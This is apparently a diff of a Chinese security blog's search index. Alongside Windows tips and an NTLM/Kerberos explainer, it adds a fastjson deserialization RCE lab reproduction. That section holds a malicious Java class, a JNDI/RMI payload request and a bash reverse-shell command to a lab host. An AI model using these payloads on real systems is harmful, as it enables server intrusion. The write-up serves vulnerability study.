@@ -1,62 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Windows10更改用户名方式</title>
-    <url>/2021/12/03/windows%E6%8A%80%E5%B7%A7/Windows10%E6%9B%B4%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<h2 id="更改方式"><a href="#更改方式" class="headerlink" title="更改方式"></a>更改方式</h2><hr>
-<p>使用管理员权限打开一个CMD</p>
-<h3 id="修改用户名"><a href="#修改用户名" class="headerlink" title="修改用户名"></a>修改用户名</h3><p>输入 <code>control userpasswords2</code> ，回车；</p>
-<p>点击属性，修改用户名，点击确定；</p>
-<h3 id="注册表修改路径位置"><a href="#注册表修改路径位置" class="headerlink" title="注册表修改路径位置"></a>注册表修改路径位置</h3><p>打开运行，输入regedit，回车；<br>定位到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList；</span><br></pre></td></tr></table></figure>
-<p>选中下面名字最长的项，双击右侧的ProfileImagePath，修改 C:\Users\ 后的用户名，点击确定；</p>
-<p>注销并重新登录；</p>
-<h3 id="重命名用户文件夹"><a href="#重命名用户文件夹" class="headerlink" title="重命名用户文件夹"></a>重命名用户文件夹</h3><p>打开 C:\User\，</p>
-<p>将新的用户名文件夹删除，</p>
-<p>再将原来的的用户名文件夹重命名为新的用户名；</p>
-<p>再次注销并重新登录。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u011479200/article/details/107902826">https://blog.csdn.net/u011479200/article/details/107902826</a></p>
-]]></content>
-      <categories>
-        <category>Windows技巧</category>
-      </categories>
-      <tags>
-        <tag>技巧</tag>
-        <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows下快速切换全拼/双拼</title>
-    <url>/2021/11/09/windows%E6%8A%80%E5%B7%A7/Windows%E4%B8%8B%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2%E5%85%A8%E6%8B%BC-%E5%8F%8C%E6%8B%BC/</url>
-    <content><![CDATA[<h1 id="Windows下快速切换全拼-双拼"><a href="#Windows下快速切换全拼-双拼" class="headerlink" title="Windows下快速切换全拼/双拼"></a>Windows下快速切换全拼/双拼</h1><h2 id="bat批处理文件方式"><a href="#bat批处理文件方式" class="headerlink" title="bat批处理文件方式"></a>bat批处理文件方式</h2><h3 id="change-bat"><a href="#change-bat" class="headerlink" title="change.bat"></a>change.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS </span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>) </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f ) <span class="keyword">else</span> ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f )</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="ChangeAll-bat"><a href="#ChangeAll-bat" class="headerlink" title="ChangeAll.bat"></a>ChangeAll.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg (</span><br><span class="line"><span class="comment">    @REM reg add %MainKey% /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d 0x1 /f</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="ChangeDouble-bat"><a href="#ChangeDouble-bat" class="headerlink" title="ChangeDouble.bat"></a>ChangeDouble.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg (</span><br><span class="line">    reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line"><span class="comment">    @REM reg add %MainKey% /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d 0x0 /f</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="VBS脚本方式"><a href="#VBS脚本方式" class="headerlink" title="VBS脚本方式"></a>VBS脚本方式</h2><h3 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h3><figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;ChangeAll.bat&quot;</span>,<span class="number">0</span></span><br><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;ChangeDouble.bat&quot;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="uTools插件"><a href="#uTools插件" class="headerlink" title="uTools插件"></a>uTools插件</h2><p>目前已经做成了 uTools 插件 , 插件名称 : <code>切换微软全拼</code></p>
-<p>项目地址: <a href="https://github.com/syyu6/utools-ChangeDouble">https://github.com/syyu6/utools-ChangeDouble</a></p>
-<p>And so on …</p>
-<h2 id="utools快捷命令"><a href="#utools快捷命令" class="headerlink" title="utools快捷命令"></a>utools快捷命令</h2><h3 id="实现-ps1-脚本"><a href="#实现-ps1-脚本" class="headerlink" title="实现 ps1 脚本"></a>实现 ps1 脚本</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$out</span> = reg query HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS /v <span class="string">&quot;Enable Double Pinyin&quot;</span>; </span><br><span class="line"><span class="variable">$outStr</span> = <span class="variable">$out</span> <span class="operator">-as</span> [<span class="built_in">string</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$outStr</span> <span class="operator">-match</span> <span class="string">&#x27;(Pinyin.+0x)(\d)&#x27;</span>) &#123;<span class="variable">$mode</span> = <span class="variable">$Matches</span>[<span class="number">2</span>] &#125; <span class="keyword">else</span> &#123; <span class="variable">$mode</span> = <span class="number">1</span> &#125;; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mode</span> <span class="operator">-as</span> [<span class="built_in">int</span>] <span class="operator">-eq</span> <span class="number">1</span>) &#123; <span class="variable">$Double</span> = <span class="number">0</span> &#125; <span class="keyword">else</span> &#123; <span class="variable">$Double</span> = <span class="number">1</span> &#125;;</span><br><span class="line">reg.exe add HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS /v <span class="string">&quot;Enable Double Pinyin&quot;</span> /t REG_DWORD /d <span class="variable">$Double</span> /f;</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Windows技巧</category>
-      </categories>
-      <tags>
-        <tag>技巧</tag>
-        <tag>Windows</tag>
-        <tag>杂谈</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>KaliLinux2021安装GUI_Tools依赖问题</title>
-    <url>/2021/11/10/%E6%9D%82%E8%B0%88/KaliLinux2021%E5%AE%89%E8%A3%85GUI-Tools%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/</url>
+    <url>/articles/59cbe3b3/</url>
     <content><![CDATA[<h2 id="KaliLinux2021安装GUI-Tools依赖问题"><a href="#KaliLinux2021安装GUI-Tools依赖问题" class="headerlink" title="KaliLinux2021安装GUI_Tools依赖问题"></a>KaliLinux2021安装GUI_Tools依赖问题</h2><h3 id="WxPython库依赖问题"><a href="#WxPython库依赖问题" class="headerlink" title="WxPython库依赖问题"></a>WxPython库依赖问题</h3><hr>
 <p> <img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003215057722.png" alt="image-20211003215057722"></p>
 <p>需要安装 <code>wxpython</code> 库 , 但是kali 下 pip3 安装, 编译会产生报错, 具体原因 我也不清楚</p>
@@ -122,7 +68,7 @@
 <p>写到这, 终于完成了所有依赖问题, 终于可以关闭所有浏览器标签页了 ==手动狗头==</p>
 ]]></content>
       <categories>
-        <category>Kali</category>
+        <category>Linux</category>
       </categories>
       <tags>
         <tag>技巧</tag>
@@ -130,8 +76,457 @@
       </tags>
   </entry>
   <entry>
+    <title>NTLM及Kerberos认证流程</title>
+    <url>/articles/60487e7c/</url>
+    <content><![CDATA[<h1 id="NTLM及Kerberos认证流程"><a href="#NTLM及Kerberos认证流程" class="headerlink" title="NTLM及Kerberos认证流程"></a>NTLM及Kerberos认证流程</h1><h2 id="NTLM认证"><a href="#NTLM认证" class="headerlink" title="NTLM认证"></a>NTLM认证</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><p>NTLM是NT LAN Manager的缩写，NTLM 是指 telnet 的一种验证身份方式，即问询/应答身份验证协议，是 Windows NT 早期版本的标准安全协议，Windows 2000 支持 NTLM 是为了保持向后兼容。Windows 2000内置三种基本安全协议之一。</p>
+<h3 id="2-认证流程"><a href="#2-认证流程" class="headerlink" title="2.认证流程"></a>2.认证流程</h3><p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312047697.png" alt="Snipaste_2021-09-09_13-48-24"></p>
+<p>①使用用户名和密码登录客户端，进行<strong>本地认证</strong></p>
+<p>②客户端首先在本地加密当前用户的密码为密码散列，即<strong>NTLM Hash</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:1">1</a></p>
+<p>③确认双方协议版本，客户端向服务器明文发送自己的账号</p>
+<p>④服务器生成一个16位的随机数字发送给客户端，即<strong>challenge</strong></p>
+<p>⑤客户端使用<strong>NTLM Hash</strong>来加密<strong>challenge</strong>，生成的结果即<strong>response</strong></p>
+<p>⑥服务器将<strong>明文的用户名</strong>、<strong>challenge</strong>、<strong>response</strong>发给域控制器(DC)</p>
+<p>⑦域控制器用这个用户名在<strong>SAM密码管理库</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:2">2</a>中找到此用户对应的<strong>NTLM Hash</strong>，并使用这个值来加密<strong>challenge</strong>，生成的结果记为<strong>response2</strong></p>
+<p>⑧域控制器对<strong>response</strong>和<strong>response2</strong>进行比较，如果一样则认证成功，反之则失败</p>
+<h4 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h4><p>Windows不会储存用户的明文密码，而是将明文密码加密后储存在SAM中</p>
+<p>本地认证的过程中，用户登录时，系统会将用户输入的明文密码加密成<strong>NTLM Hash</strong>，然后和SAM中的<strong>NTLM Hash</strong>进行比较从而完成认证</p>
+<p>用户进行任何注销操作（注销登录，重启，锁屏等），<strong>winlogon</strong>进程会显示密码输入界面，接受用户输入密码后交给<strong>lsass</strong>进程，这个进程中会保存一份明文密码，然后加密成<strong>NTLM Hash</strong></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; 本地认证</span><br></pre></td></tr></table></figure>
+
+<h4 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM Hash的生成"></a>NTLM Hash的生成</h4><ul>
+<li>  用户明文密码：<code>y5neko123</code></li>
+<li>  十六进制转换为：<code>79356e656b6f313233</code></li>
+<li>  转换为Unicode码，相当于在每个字节后添加一个0x00：<code>790035006e0065006b006f00310032003300</code></li>
+<li>  以十六进制进行MD4加密：<code>2aec2647511a853cbec96388c4ae8770</code></li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312047362.png" alt="image-20210909131622932"></p>
+<h2 id="Kerberos认证"><a href="#Kerberos认证" class="headerlink" title="Kerberos认证"></a>Kerberos认证</h2><h3 id="1-概念-1"><a href="#1-概念-1" class="headerlink" title="1.概念"></a>1.概念</h3><p>Kerberos 是一种由 MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证。</p>
+<p>Kerberos 主要是用在域环境下的身份认证协议。</p>
+<h3 id="2-认证流程-1"><a href="#2-认证流程-1" class="headerlink" title="2.认证流程"></a>2.认证流程</h3><p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312047736.png" alt="img"></p>
+<p>Kerberos 协议中主要有四个角色的存在：</p>
+<ol>
+<li> 访问服务的 Client</li>
+<li> 提供服务的 Server</li>
+<li> KDC（Key Distribution Center）密钥分发中心<a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:3">3</a></li>
+<li> AD（Account Database）</li>
+</ol>
+<hr>
+<h4 id="KDC的构成"><a href="#KDC的构成" class="headerlink" title="KDC的构成"></a>KDC的构成</h4><p><strong>Authentication Service</strong>：认证服务器，以下简称AS，作用就是验证 Client 端的身份，验证通过会发送一张<strong>TGT（Ticket Granting Ticket）</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:4">4</a>票据给 Client</p>
+<p><strong>Ticket Granting Service</strong>：票据分发服务器，以下简称TGS，作用是通过 AS 发送给 Client 的票据（TGT）换取<strong>ST（ServiceTicket</strong>）<a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:5">5</a>，也被称为<strong>TGS Ticket</strong></p>
+<hr>
+<p>Kerberos认证大体上分为三个流程：</p>
+<ol>
+<li> The Authentication Service Exchange：Client 与 AS 的交互</li>
+<li> The Ticket-Granting Service (TGS) Exchange：Client 与 TGS 的交互</li>
+<li> The Client/Server Authentication Exchange：Client 与 Server 的交互</li>
+</ol>
+<hr>
+<h4 id="一、Authentication-Service-Exchange"><a href="#一、Authentication-Service-Exchange" class="headerlink" title="一、Authentication Service Exchange"></a>一、Authentication Service Exchange</h4><p><strong>KRB_AS_REQ（请求）</strong></p>
+<p>Client –&gt; AS：客户端向KDC的AS发送<strong>Authenticator1</strong>，内容包含：</p>
+<ul>
+<li>  Pre-authentication data：包含用以证明自己身份的信息，一般它的内容是一个被Client hash加密过的时间戳</li>
+<li>  Client name &amp; realm：用户信息</li>
+<li>  TGS的Server name</li>
+</ul>
+<p><strong>KRB_AS_REP（响应）</strong></p>
+<p>AS –&gt; Client：AS根据用户名在AD中判断是否在白名单中，接着进行验证发送方是否为Client name中声称的用户</p>
+<p>也就是需要验证发送方是否知道该用户名的密码，此时只需要从AD中使用相应的<strong>NTLM Hash</strong>对请求包中的<strong>Pre-authentication data</strong>进行解密，如果是一个合法的时间戳，则说明提供的密钥无误</p>
+<p>验证成功后提取相应的<strong>NTLM Hash</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:1">1</a>，此时会生成一个随机数<strong>SessionKey</strong>，然后使用提取的<strong>NTLM Hash</strong>来加密<strong>SessionKey</strong>，生成<strong>SessionKey-as</strong>作为AS数据，再返回一个<strong>TGT</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:4">4</a></p>
+<blockquote>
+<p>  简述：在 KDC(AD) 中存储了域中所有用户的密码 HASH，当 AS 接收到 Client 的请求之后会根据 KDC 中存储的密码来解密，解密成功并且验证信息，验证成功后返回给Client两个数据，由 Client 密码 HASH 加密的SessionKey-as和TGT。</p>
+</blockquote>
+<p>Client收到KRB_AS_REP，通过自己的<strong>NTLM Hash</strong>对返回的<strong>SessionKey-as</strong>进行解密得到<strong>SessionKey</strong>后，即可携带<strong>TGT</strong>进入下一步骤</p>
+<hr>
+<h4 id="二、Ticket-Granting-Service-TGS-Exchange"><a href="#二、Ticket-Granting-Service-TGS-Exchange" class="headerlink" title="二、Ticket-Granting Service (TGS) Exchange"></a>二、Ticket-Granting Service (TGS) Exchange</h4><p><strong>KRB_TGS_REQ（请求）</strong></p>
+<p>Client –&gt; TGS：Client向KDC的TGS发送<strong>Authenticator2</strong>，内容包含：</p>
+<ul>
+<li>  TGT</li>
+<li>  Authenticator：用以证明当初TGT的拥有者是自己，使用SessionKey来进行加密，其中包含有客户端信息和时间戳</li>
+<li>  Client name &amp; realm</li>
+<li>  Server name &amp; realm：Client要访问的Server</li>
+</ul>
+<p><strong>KRB_TGS_REP（响应）</strong></p>
+<p>TGS –&gt; Client：TGS首先通过自己的NTLM Hash（krbtgt账户的NTLM Hash）对Client提供的TGT进行解密，即可得到<strong>SessionKey</strong>，再通过这个SessionKey解密Client提供的<strong>Authenticator</strong>来进行验证，此时生成一个<strong>SessionKey-tgs</strong></p>
+<p>验证成功后向对方发送两个数据：</p>
+<ul>
+<li>  使用SessionKey加密<strong>SessionKey-tgs</strong>生成<strong>SessionKey-tgs-encrypt</strong>，用于Client和Server的认证</li>
+<li>  使用Server的NTLM Hash加密<strong>SessionKey-tgs</strong>生成<strong>ST</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:5">5</a></li>
+</ul>
+<p>Client收到KRB_TGS_REP，使用SessionKey对返回的<strong>SessionKey-tgs-encrypt</strong>进行解密得到<strong>SessionKey-tgs</strong>，有了<strong>SessionKey-tgs</strong>和<strong>ST</strong>，Client就可以和Server交互了，至此TGS的任务完成</p>
+<hr>
+<h4 id="三、Client-Server-Authentication-Exchange"><a href="#三、Client-Server-Authentication-Exchange" class="headerlink" title="三、Client/Server Authentication Exchange"></a>三、Client/Server Authentication Exchange</h4><p><strong>KRB_AP_REQ（请求）</strong></p>
+<p>Client –&gt; Server：Client向Server发送<strong>Authenticator3</strong>，内容包含：</p>
+<ul>
+<li>  ST</li>
+<li>  Authenticator：用以证明当初TGT的拥有者是自己，使用SessionKey来进行加密，其中包含有客户端信息和时间戳</li>
+<li>  Flag：用于表示Client是否需要进行双向验证</li>
+</ul>
+<p><strong>KRB_AP_REP（响应）</strong></p>
+<p>Server –&gt; Client：Server首先通过自己的NTLM Hash对收到的ST进行解密，即可得到<strong>SessionKey-tgs</strong>，再通过这个<strong>SessionKey-tgs</strong>解密收到的<strong>Authenticator</strong>即可验证身份，原理同上</p>
+<p>此时连接建立成功。</p>
+<blockquote>
+<p>  对于需要进行双向验证，Server从Authenticator提取Timestamp，使用**SessionKey(Server-Client)**进行加密，并将其发送给Client用于Client验证Server的身份。</p>
+</blockquote>
+<hr>
+<ol>
+<li> 通常意义上的NTLM Hash指存储在SAM数据库及NTDS数据库中对密码进行 Hash摘要计算后的结果，这类 Hash可以直接用于 PTH，并且通常存在于LSASS进程中，便于 SSP（NTLM 安全支持提供程序）使用。 Account Manager Database，安全账号管理数据库 [</li>
+<li> KDC 服务默认会安装在一个域的域控中，KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</li>
+<li> TGT包含：使用KDC中krbtgt账户的NTLM Hash加密的SessionKey、Client name &amp; realm以及End Time：TGT的到期时间</li>
+<li> 可以用来访问 Server 端的票据，包含：SessionKey-tgs、Client name &amp; realm以及End Time：ST的到期时间</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>知识库</category>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fastjson漏洞复现</title>
+    <url>/articles/602d9e2a/</url>
+    <content><![CDATA[<h1 id="fastjson漏洞复现"><a href="#fastjson漏洞复现" class="headerlink" title="fastjson漏洞复现"></a>fastjson漏洞复现</h1><blockquote>
+<p>  Fastjson是一个Java库，可用于将Java对象转换为其JSON表示形式。它还可以用于将JSON字符串转换为等效的Java对象,fastjson爆出多个反序列化远程命令执行漏洞，攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对fastjson版本小于1.2.48的版本通杀，autoType为关闭状态也可使用。</span><br><span class="line">loadClass中默认cache设置为true，利用分为2步执行，首先使用java.lang.Class把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.JdbcRowSetImpl这个类，绕过了黑名单机制</span><br><span class="line">该payload会利用fastjson的反序列化漏洞去指定的rmi/ldap服务进行远程方法调用</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>主机A： <a href="http://192.168.56.106:8090/">http://192.168.56.106:8090</a> (存在Fastjson漏洞主机)</p>
+<p>主机B： <a href="http://192.168.56.1:8989/">http://192.168.56.1:8989</a> (恶意java类服务)</p>
+<p>主机C： rmi://192.168.56.1:9999 (远程方法调用服务)</p>
+<p> PS:   实际上主机B和C是一台机器不同端口</p>
+</blockquote>
+<h2 id="fastjson-1-2-24-rce"><a href="#fastjson-1-2-24-rce" class="headerlink" title="fastjson/1.2.24-rce"></a>fastjson/1.2.24-rce</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用 <code>vulhub</code> 搭建 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312143662.png" alt="image-20210901132856918" style="zoom:80%;" />
+
+<p>因为目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，</p>
+<p>可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令。</p>
+<p>Command ： <code>touch /tmp/success</code>   </p>
+<blockquote>
+<h5 id="TouchFile-java"><a href="#TouchFile-java" class="headerlink" title="TouchFile.java"></a>TouchFile.java</h5></blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TouchFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.56.1：8989/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312143924.png" alt="image-20210901133439751" style="zoom:80%;" />
+
+<p>使用python 搭建一个简单的http服务器</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server --bind 192.168.56.1 8989</span><br></pre></td></tr></table></figure>
+
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312143667.png" alt="image-20210901133540829" style="zoom:80%;" />
+
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a><strong>Payload</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 162</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.56.1:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144666.png" alt="image-20210901133841607"></p>
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144883.png" alt="image-20210901134528910" style="zoom:67%;" />
+
+
+
+<p>可见命令执行成功！漏洞成功复现</p>
+<img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312150318.png" alt="image-20210901133735111" style="zoom:67%;" />
+
+
+
+<h3 id="DNSlog-测试"><a href="#DNSlog-测试" class="headerlink" title="DNSlog 测试"></a>DNSlog 测试</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;a&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.net.Inet4Address&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;v5guyp.dnslog.cn&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144158.png" alt="image-20210901144126030"></p>
+<h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>使用 <code>nc</code> 监听得到反弹shell</p>
+<blockquote>
+<h4 id="Evil-java"><a href="#Evil-java" class="headerlink" title="Evil.java"></a>Evil.java</h4></blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac Evil.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;/bin/bash&quot;</span>, <span class="attr">&quot;-c&quot;</span>, <span class="attr">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
